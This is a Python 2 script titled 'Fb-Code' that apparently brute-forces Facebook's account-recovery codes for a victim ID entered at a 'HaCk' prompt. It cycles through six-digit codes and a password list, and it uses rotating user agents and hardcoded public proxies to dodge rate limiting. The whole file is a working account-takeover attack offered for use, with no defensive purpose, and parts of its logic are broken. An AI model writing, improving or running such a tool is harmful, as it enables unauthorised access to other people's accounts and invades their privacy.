#/python/bin/Lartistou Ala


import os
import sys
import mechanize
import cookielib
import random
import time
import requests

Ramadi = '\033[1;30m'
A7mar = '\033[1;31m'
A5thar = '\033[1;32m'
Asfar = '\033[1;33m'
Azra9 = '\033[1;34m'
Roz = '\033[1;35m'
Azra92 = '\033[1;36m'
os.system('clear')
print (Roz)
os.system("figlet Fb-Code")

print(A7mar)
email=str(raw_input( 'Enter ID To HaCk :'+ Azra92))

#password
print(Azra9)
pa=int(input('Enter passter code ~~> :'+ Asfar))
loger = 'https://m.facebook.com/login/identify/?ctx=recover&ref=dbl'



#user
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 .Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

proxy = '24.172.34.114','52143'
proxy2 = '68.183.121.199','80'
proxy3 = '104.238.146.146','8111'
proxy4 = '172.83.138.45','53281'
proxy5 ='52.124.6.146','40834'
proxy6 ='104.198.232.184','80'
def main():
        global browser
        browser = mechanize.Browser()
        k=browser.set_proxies
        time.sleep(1)
        k=browser.set_proxies({'http':proxy})
        time.sleep(1)
        k=browser.set_proxies({'http':proxy2})
        time.sleep(1)
        k=browser.set_proxies({'http':proxy3})
        time.sleep(1)
        k=browser.set_proxies({'http':proxy4})
        time.sleep(1)
        k=browser.set_proxies({'http':proxy5})
        time.sleep(1)
        k=browser.set_proxies({'http':proxy6})
        cj = cookielib.LWPCookieJar()
        browser.set_handle_robots(False)
        browser.set_handle_redirect(True)
        browser.set_cookiejar(cj)
        browser.set_handle_equiv(True)
        browser.set_handle_referer(True)
        browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=0)
        Search()
        search()
        print(A5thar)
        print ('code not checking on the passlist')

def brute(password):
        sys.stdout.flush
        browser.addheaders = [('User-Agent', random.choice(useragents))]
        site = browser.open(loger)
        browser.select_form(nr=0)
        browser.form["email"]= email
        sub = browser.submit()
        browser.select_form(nr=0)
        sub = browser.submit()
        browser.select_form(nr=0)
        browser.form["n"]=password
        sub = browser.submit()
        log = browser.geturl()
        if 'recover/password/?u' not in log:
           print(Asfar)
           print '\r /code inccorect/'+password
        elif 'recover/password/?u' in log:
           print(Roz)
           print ('code Is correct  ====>') + password
           print(Azra92)
           print "This is the correct code ....." + password 
           exit()

def Search():
    global password
    for password in range(pa,999999):
        password=str(password).replace("\n","")
        brute(password)
        if pa == '1000000':
           intro()
def search():
        global password
        print(A5thar)
        zzzz=raw_input('Enter PasswordList:' + Roz)
        Ala = open(zzzz,'r')
        for  password in Ala:
             password = password.replace("\n","")
             brute(password)


main()
